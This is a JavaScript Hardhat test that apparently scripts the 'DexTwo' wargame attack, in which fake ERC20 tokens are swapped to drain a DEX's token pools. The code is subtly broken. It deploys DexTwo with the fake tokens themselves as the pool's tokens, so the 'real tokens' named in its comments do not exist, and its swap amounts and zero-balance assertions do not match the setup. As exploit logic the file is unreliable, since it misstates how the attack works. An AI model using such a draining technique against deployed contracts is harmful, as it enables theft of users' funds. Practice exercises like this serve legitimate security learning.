const { expect } = require("chai");

describe("DexTwo contract", function () {
  it("Should drain all token1 and token2", async function () {
    const [owner] = await ethers.getSigners();

    // Deploy FakeToken contract
    const FakeToken = await ethers.getContractFactory("FakeToken");
    const fakeToken1 = await FakeToken.deploy(10000);
    const fakeToken2 = await FakeToken.deploy(10000);

    // Deploy DexTwo contract
    const DexTwo = await ethers.getContractFactory("DexTwo");
    const dexTwo = await DexTwo.deploy(fakeToken1.address, fakeToken2.address);

    // Mint some fake tokens and approve DexTwo to spend them
    await fakeToken1.approve(dexTwo.address, ethers.constants.MaxUint256);
    await fakeToken2.approve(dexTwo.address, ethers.constants.MaxUint256);

    // Transfer 1 fake token to DexTwo for initial liquidity
    await fakeToken1.transfer(dexTwo.address, 1);
    await fakeToken2.transfer(dexTwo.address, 1);

    // Swap fake tokens for real tokens
    await dexTwo.swap(fakeToken1.address, fakeToken2.address, 100);
    await dexTwo.swap(fakeToken2.address, fakeToken1.address, 100);

    // Check that all real tokens have been drained
    const token1Balance = await dexTwo.balanceOf(
      fakeToken1.address,
      dexTwo.address
    );
    const token2Balance = await dexTwo.balanceOf(
      fakeToken2.address,
      dexTwo.address
    );

    expect(token1Balance).to.equal(0);
    expect(token2Balance).to.equal(0);
  });
});
